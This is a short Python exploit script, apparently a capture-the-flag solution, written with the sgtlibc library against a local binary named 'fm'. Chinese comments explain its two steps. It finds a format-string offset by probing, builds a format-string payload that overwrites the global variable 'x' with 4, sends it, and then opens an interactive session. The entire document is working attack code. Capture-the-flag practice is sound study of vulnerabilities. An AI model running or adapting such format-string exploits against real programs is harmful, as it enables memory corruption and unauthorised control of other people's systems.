import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
set_config(GameBoxConfig(
    is_local=True,
    file='./fm',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf


def exec(payload):
    start_game()
    sl(payload)
    info = rl()
    return info

# 通过迭代寻找格式化字符串位置
offset = FmtStr(exec, numbwritten=0x10).offset
# 格式化字符串修改指定地址
g_x_addr = elf.symbols['x']
payload = fmtstr_payload(offset, {g_x_addr: 4})
start_game()
sl(payload)

interactive()
